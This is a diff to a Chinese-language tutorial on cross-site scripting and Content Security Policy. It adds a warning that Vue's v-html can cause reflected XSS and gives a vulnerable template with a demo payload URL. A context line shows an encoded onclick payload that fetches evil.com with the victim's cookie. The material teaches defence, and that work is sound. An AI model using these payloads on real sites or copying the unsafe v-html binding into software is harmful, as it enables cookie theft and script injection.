@@ -390,7 +390,24 @@ kebingzao'%20onclick%3D'javascript%3Afetch(%60https%3A%2F%2Fevil.com%2F%3Fcookie
 
 这边可以忽略掉 fetch 的跨域问题，因为数据已经抛送过去了。 危害已经造成了。
 
+#### 警惕 vue 的 v-html 语法
+还有需要注意一点的是， 现在很多前端框架都有用到 vue 框架，一定要谨慎使用 `v-html` 语法，这个很容易会造成反射型的 xss
+
+举个例子，比如我这边有一个 p 标签这样子设置, 直接获取 `vue-router` 的 msg 的参数 (vue3 语法)
+```text
+<p v-html="route.query.msg"></p>
+```
+然后一旦我这样子请求:
+```text
+https://192.168.40.51:3001/#/?msg="><img src=x onerror=alert('XSS');>
+```
+
+就一定会触发这个 反射型的 css 漏洞
+
+![](22.png)
+
 防御方式跟 上面例子的 `dom base xss` 一样，就是要设置 default-src 和 对应的 xxx-src 的值，不赘述。
+
 
 ### 4. 模拟存储型 xss 的 demo
 还有一个存储型的 xss， 存储型的 xss， 一般都是通过提交，将具有 xss 的字串放在数据库。 然后在展示给用户的时候，直接触发里面的 js，一般常见于留言板之类的
